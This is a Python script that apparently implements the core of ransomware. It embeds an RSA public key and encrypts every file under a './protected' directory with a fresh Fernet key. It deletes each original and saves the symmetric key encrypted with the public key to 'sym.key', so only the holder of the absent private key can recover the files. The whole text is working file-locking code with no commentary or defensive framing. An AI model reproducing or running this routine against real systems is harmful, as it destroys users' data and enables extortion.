from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.fernet import Fernet
import os

PUBLIC_KEY = b"""
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArruPYSFlLAnw/aVi8qYT
bN3Bh2JACUVqnzxo6TzqUO/kCQZTP3ipu0hicvjwxeaxyH5PBXT/gR/5+n7+eGXg
bwmSPr0ULfY7k0aLV3s5YD3cxY7iLqTqzbh39DhheM7xinMHjpCW3P1x5kgo6RCE
NHMe3hW4bvZjO4jUd/l2GA1sLWsOFB9nHzucT5Tm9rB8qTj7cHU8Iqzdk3erYtVc
uC1EPJpNQGSJj0+6rdN+sC3sIILmz1yZXcSjSCrcZm8NDdJvqXBddIiVMCP272r5
Wa7yA/fDEZoXTAkdF2ESZYOZBOGoDyR0IDeZwl8Xj71nsQWSNSVY1q31evyiNIl2
HQIDAQAB
-----END PUBLIC KEY-----
"""

def load_public_key():
    public_key = serialization.load_pem_public_key(
        PUBLIC_KEY,
        backend=default_backend()
    )
    return public_key

def encrypt_with_public_key(content, public_key):
    encrypted = public_key.encrypt(
        content,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted

def encrypt_file(filepath, fernetobj):
    with open(filepath, "rb") as f:
        contents = f.read()
        encrypted_content = fernetobj.encrypt(contents)
        encrypted_file = open(filepath + ".enc", "wb")
        encrypted_file.write(encrypted_content)
        encrypted_file.close()

def remove_file(filepath):
    os.remove(filepath)

public_key = load_public_key()

symkey = Fernet.generate_key()
f = Fernet(symkey)

for path, curdir, files in os.walk("./protected"):
    for file in files:
        filepath = os.path.join(path, file)
        encrypt_file(filepath, f)
        remove_file(filepath)

encrypted_symmetric_key = encrypt_with_public_key(symkey, public_key)
with open("sym.key", "wb") as f:
    f.write(encrypted_symmetric_key)